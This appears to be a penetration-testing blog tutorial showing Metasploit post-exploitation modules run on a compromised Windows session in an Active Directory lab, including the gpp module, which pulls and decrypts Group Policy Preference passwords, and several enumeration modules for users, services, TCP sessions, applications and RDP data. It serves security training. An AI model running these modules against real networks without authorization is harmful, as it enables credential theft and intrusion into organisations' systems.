<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Penetration Testing in Active Directory using Metasploit (Part 2)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-active-directory-using-metasploit-part-2/" rel="bookmark"><time class="entry-date published" datetime="2016-08-10T10:16:41+00:00">August 10, 2016</time><time class="updated" datetime="2025-05-12T21:19:39+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3><span style="color: #800000;"><strong>Enumerate all logged on users</strong></span></h3>
<p><span style="color: #000000;"> This module will enumerate current and recently logged on Windows users.</span></p>
<p><span style="color: #000000;">msf &gt; <strong>use post/windows/gather/enum_logged_on_users</strong></span></p>
<p><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>enum_logged_on_users</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p><span style="color: #000000;">msf post(<span style="color: #800000;"><strong>enum_logged_on_users</strong></span>) &gt; <strong>exploit</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Ny0Ay3LLvBA/V6r5zXUTUNI/AAAAAAAANGE/luBWRag9DCcVePH3RLbaNqOjJAa6HN7AwCLcB/s1600/1.png"/></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Gather All Group Policy Preference</strong> </span></h3>
<p style="text-align: justify;"><span style="color: #000000;">This module enumerates the victim machine’s domain controller and connects to it via SMB. It then looks for <strong>Group Policy Preference</strong> XML files containing local user accounts and passwords and decrypts them using Microsoft’s public AES key. Cached Group Policy files may if the group policy object is deleted rather than unlinked. Tested on WinXP SP3 Client and Win2k8 R2 DC.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>&gt; <strong>use post/windows/gather/credentials/gpp</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>gpp</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>gpp</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-kxZZmEI6W5g/V6r5lTfbFOI/AAAAAAAANF8/7r5nkWfYXhMC21mfNsShdo9Cy3nz4Mg4QCLcB/s1600/2.png"/></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-MI0F5oTBa_E/V6r5bTYP3cI/AAAAAAAANF4/B_2HDadIiAwMxvnbnWaNqeEHJTbkjoa2QCLcB/s1600/3.png"/></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Find All DNS Service Records</strong></span></h3>
<p style="text-align: justify;"><span style="color: #000000;">Enumerates know <strong>SRV Records</strong> for a given domain using target host DNS query tool.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> &gt; <strong>use post/multi/gather/dns_srv_lookup</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>dns_srv_lookup</strong></span>) &gt; <strong>set domain rajlab.com</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>dns_srv_lookup</strong></span>) <strong>&gt; set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>dns_srv_lookup</strong></span>) <strong>&gt; exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-QWMMgEYW1V8/V6r5pBtYmSI/AAAAAAAANGA/wPbVXLJ9S-caUQaEiOjbyYsisZ7KorhcQCLcB/s1600/4.png"/></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Find All Services in Server</strong></span></h3>
<p style="text-align: justify;"><span style="color: #000000;">This module will query the system for services and display name and configuration info for each returned service. It allows you to optionally search the credentials, path, or start type for a string and only return the results that match. These query operations are cumulative and if no query strings are specified, it just returns all services. NOTE: If the script hangs, windows firewall is most likely on and you did not migrate to a safe process (explorer.exe for example)</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> &gt; <strong>use post/windows/gather/enum_services</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_services</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_services</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/--IYbegr9Dms/V6r6FFp7sUI/AAAAAAAANGM/RMb2rve9FukLsR75SaLwij44u_V-KFW9wCLcB/s1600/5.png"/></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Find All Active Directory TCP sessions</strong></span></h3>
<p style="text-align: justify;"><span style="color: #000000;"><strong> </strong>This Module lists current <strong>TCP sessions</strong>.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> &gt; <strong>use post/windows/gather/tcpnetstat</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>tcpnetsta</strong>t</span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>tcpnetstat</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-MmDRr2E9VNM/V6r53gkdXrI/AAAAAAAANGI/jxZPSKldu8QIFHY4tuz8lw67c8eefR45gCLcB/s1600/6.png"/></p>
<h3><span style="color: #800000;"><strong>Find All Installed Application in Server</strong></span></h3>
<p><span style="color: #000000;"><strong> </strong>This module will enumerate all installed applications</span></p>
<p><span style="color: #000000;"><strong>msf</strong> <strong>&gt; use post/windows/gather/enum_applications</strong></span></p>
<p><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_applications</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>enum_applications</strong></span>) &gt; <strong>exploit</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-rqDvP8MkiGc/V6r6GVa-WpI/AAAAAAAANGQ/uyRV7cla1QI9La5fyBMyaxSVr2vywZwgACLcB/s1600/7.png"/></p>
<h3 style="text-align: justify;"><span style="color: #800000;"><strong>Find All Remote Desktop Session</strong></span></h3>
<p style="text-align: justify;"><span style="color: #000000;"><strong> </strong>This module dumps MRU and connection data for <strong>RDP sessions</strong>.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>&gt; <strong>use post/windows/gather/enum_termserv</strong> </span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf</strong> post(<span style="color: #800000;"><strong>enum_termserv</strong></span>) &gt; <strong>set session 1</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>msf </strong>post(<span style="color: #800000;"><strong>enum_termserv</strong></span>) &gt; <strong>exploit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-3Rtc2ytB1jo/V6r6IrhFlII/AAAAAAAANGY/-DCKZfOS4yoIagCkh2Npb4l_dx_oqPPXgCLcB/s1600/8.png"/></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
